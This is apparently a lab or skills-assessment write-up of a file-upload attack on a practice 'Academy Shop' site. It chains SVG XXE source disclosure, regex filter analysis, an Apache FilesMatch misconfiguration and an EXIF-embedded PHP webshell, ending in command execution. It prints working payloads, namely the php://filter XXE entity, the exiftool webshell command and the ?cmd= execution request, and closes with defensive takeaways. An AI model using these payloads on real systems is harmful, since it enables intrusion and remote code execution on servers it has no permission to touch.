# Skill Assisment

**Source:** Write-up / assessment combining upload filter bypass + XXE + Apache misconfig + EXIF polyglot

---

## Target

- "Academy Shop" — e-commerce site. Homepage uninteresting.
- Attack surface found on **Contact Us** page: feedback form with name/email/message + **image upload** ("Attach a screenshot").

---

## Step 1 — Recon: What Does the Upload Accept?

- Normal image upload works (baseline confirmed).
- Intercepted upload request in Burp → **fuzzed the file extension** with a wordlist.
- Most PHP-related extensions → `"Only images are allowed"` → indicates a **whitelist**, not just a blacklist of bad extensions.
- **`.svg` passed** — SVG is a valid image format per the whitelist, but it's also XML → opens the door to **XXE**.

---

## Step 2 — Finding Where Files Land

- No path/preview link returned after upload → storage location unknown.
- Tried **directory fuzzing**:

```bash
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

- **Dead end** — nothing found (non-standard directory name not in wordlists).
- Pivoted to **reading the server's source code directly**, using the SVG upload as the vector.

---

## Step 3 — Reading Source via SVG XXE

- SVG = XML → supports **external entity references**.
- Payload uses PHP's `php://filter` wrapper to read `upload.php` and return it base64-encoded (same technique as the standard XXE-source-disclosure pattern):

```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
```

- Server resolves the entity, returns `upload.php` base64-encoded inside the SVG response.
- Decoded via CyberChef → full source code of the upload handler obtained.

---

## Step 4 — Source Code Findings

### Storage Location & Naming

```php
$target_dir = "./user_feedback_submissions/";
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;
```

- Files stored at **`/user_feedback_submissions/`**.
- Filename = `date('ymd')` + `_` + original filename. **No randomization** (no UUID/hash) → storage path is **fully predictable**.
- Example: uploading `shell.phar.jpg` today → stored as `/user_feedback_submissions/260605_shell.phar.jpg`.
- This directory name was specific enough that it wasn't in the fuzzing wordlist — reading source was the only reliable way to find it.

### The Three Filter Layers

```php
// 1. Blacklist
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed"; die();
}
// 2. Whitelist
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed"; die();
}
// 3. MIME/content type check
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed"; die();
    }
}
```

| Layer | Logic | Weakness |
|---|---|---|
| **Blacklist** | Matches `.php`, `.phps`, `.phtml` anywhere in filename | Case-sensitive, no word boundary — `.PHP`, `.pHp`, `.phar` all slip through |
| **Whitelist** | Filename must **end** (`$` anchor) with 2-3 lowercase letters + `g` (`.jpg`, `.png`, `.svg`) | Anchored only at the **end** — doesn't care what comes before; classic double-extension (`shell.jpg.php`) fails since it doesn't end in `g`, but a **reverse** structure can still pass |
| **MIME check** | `mime_content_type()` — **deep content inspection**, not just magic bytes | Can't be beaten by prepending magic bytes alone — file must genuinely be a valid image throughout |

---

## Step 5 — Confirming the Filters (Testing)

- Tried obvious PHP extensions → caught by **blacklist**.
- Changed `Content-Type` header → no effect (blacklist checks the **filename**, not the header).
- Tried a disallowed MIME with `.jpg` extension → blacklist passed, but **MIME check** caught it (different error message) → confirmed two independent filter layers with distinguishable errors.
- Every PHP-executable extension tried was caught by one of the two filters — they covered each other's gaps **on the application side**.

---

## Step 6 — The Pivot: Apache, Not Just the App Filter

- App-side filter looked airtight → shift focus to **what happens after the file is stored** (i.e., how Apache decides what to execute as PHP).
- Apache's execution config is **completely independent** from the app's upload filter.
- Apache often uses a `FilesMatch` directive like:

```apache
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

- **Critical detail:** no `$` anchor — Apache checks if `.phar` (etc.) appears **anywhere** in the filename, not just at the end.

### How `shell.phar.jpg` Beats All Three Layers

| Layer | Check | Result on `shell.phar.jpg` |
|---|---|---|
| App Blacklist | Looks for `.php`/`.phps`/`.phtml` | Not present → **passes** |
| App Whitelist | Must end in `[a-z]{2,3}g` | Ends in `.jpg` → **passes** |
| Apache FilesMatch | `.phar` anywhere in name | Present → **executed as PHP** |

- Gap exploited: app filters anchor at the **end** of the filename; Apache's pattern matches **anywhere**.

---

## Step 7 — Beating the MIME Check: EXIF Injection

- `mime_content_type()` does deep inspection → can't just prepend magic bytes to PHP code.
- Solution: hide the PHP payload inside a **genuinely valid JPEG's EXIF metadata** (e.g., the Comment field) — file structure stays valid throughout.

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' real_image.jpg -o shell.phar.jpg
```

- Result: a file that is simultaneously (a) a **valid JPEG** passing every content check, and (b) a **PHP webshell** waiting for execution.

---

## Step 8 — Execution

1. Upload `shell.phar.jpg` via the feedback form.
2. Navigate to the predictable stored path:

```
/user_feedback_submissions/260605_shell.phar.jpg?cmd=id
```

3. Apache sees `.phar` in the filename → hands the file to the PHP interpreter.
4. PHP interpreter scans the binary JPEG, finds the `<?php ... ?>` tag inside the EXIF comment, executes it.
5. Output (`uid=33(www-data)...`) appears mixed in with the raw image data in the response.

---

## Full Attack Chain Summary

1. **Upload form** on Contact Us page → attack surface.
2. **Extension fuzzing** → `.svg` allowed → opens door to **XXE**.
3. **Directory fuzzing fails** → pivot to reading source code.
4. **SVG XXE** reads `upload.php` → reveals storage path **and** all three filter layers.
5. **Predictable storage path** (date prefix only, no randomization) → know exactly where the shell will land.
6. **Whitelist anchors with `$`** → classic double extension (`shell.jpg.php`) fails, but a **reverse double extension** (`shell.phar.jpg`) passes the app's own checks.
7. **Apache `FilesMatch` has no `$`** → `.phar` anywhere in the filename triggers PHP execution server-side.
8. **MIME check does deep inspection** → defeated via **EXIF metadata injection** into a real, valid JPEG.

---

## Key Takeaways

- Application-level filters and the **web server's own execution config** (Apache `FilesMatch`/`AddHandler`, etc.) are **independent layers** — a filter that's airtight on the app side can still be bypassed if the server's handler matching logic is looser (e.g., missing a `$` anchor).
- Regex anchoring details matter enormously: `/^.+\.[a-z]{2,3}g$/` (anchored at end) vs. Apache's `.+\.ph(ar|p|tml)` (unanchored, matches anywhere) — this mismatch is the entire vulnerability.
- Deep MIME/content-type inspection (`mime_content_type()`) can still be defeated by embedding payloads in **metadata fields** (EXIF) that don't affect the file's validity as an image.
- When direct enumeration (directory fuzzing) fails, **XXE-based source code disclosure** via an allowed file type (SVG) is a powerful alternative to find hidden paths and understand server-side logic directly.
- Predictable file-naming schemes (date prefix + original name, no UUID/hash) remove the need to guess or brute-force the uploaded file's final location.
